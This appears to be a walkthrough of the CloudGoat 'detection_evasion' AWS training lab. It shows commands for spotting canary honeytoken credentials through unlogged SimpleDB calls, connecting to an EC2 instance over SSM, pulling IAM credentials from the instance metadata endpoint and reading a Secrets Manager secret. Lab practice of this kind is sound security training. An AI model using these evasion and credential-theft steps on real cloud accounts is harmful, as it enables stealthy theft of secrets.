# Detection Evasion

This scenario is significantly different from the CloudGoat scenarios that have come before in how it plays. In detection_evasion, your goals will be outlined for you more clearly, and the challenge is to complete them without triggering alarms. There is more setup involved in this scenario, and it will take longer to play (you might want/need to play it multiple times).

After deployment is complete, you will need to wait about an hour before playing the scenario. This is, unfortunately, necessary for the cloudwatch alerts to fully integrate with cloudtrails logs. It should also be kept in mind that there can be a significant delay in alerts for actions that you take (10-15 minutes is not uncommon). So check your email periodically to see if you have triggered an alert.

Goal: The goal of this scenario is to read out the values for both secrets without being detected. The secrets are both stored in Secrets Manager, and their values have the following format (cg-secret-XXXXXX-XXXXXX).

# Walkthrough

## Login 
```
aws configure --profile user1
aws configure --profile user2
aws configure --profile user3
aws configure --profile user4
```

## Check for honeytokens
By listing domains, these don't get logged in cloudtrail
```
aws --profile user1 sdb list-domains
Returned that it is from canarytokens.com@@kz9r8ouqnhve4zs1yi4bzspzz -> Canary token domain

aws --profile user2 sdb list-domains
From SpaceCrab/l_salander (permission denied)

aws --profile user3 sdb list-domains
From cd1fceca-e751-4c1b-83e4-78d309063830 (permission denied)

aws --profile user4 sdb list-domains 
No problem with this user
```

## Enumerate Ec2 instances and connect
```
aws ec2 describe-instances --profile user4 | grep detection
Found instance i-0fc9c955ce8c225f7 

aws ssm start-session --target i-0fc9c955ce8c225f7 --profile user4
!! Refer to the following to install ssm on mac: https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html
```

## Retrieve IMDS credentials -> Alarms
```
curl http://169.254.169.254/latest/meta-data/iam/security-credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/detection_evasion_cgidp5vc3m9ykf_easy
```

## Option 1: Easy path 
```
sudo yum install awscli 

aws secretsmanager list-secrets --region us-east-1
Found secret id detection_evasion_cgidp5vc3m9ykf_easy_secret

aws secretsmanager get-secret-value --secret-id detection_evasion_cgidp5vc3m9ykf_easy_secret --region us-east-1
Found secret cg-secret-889877-2823411
```


# References

https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/scenarios/detection_evasion/README.md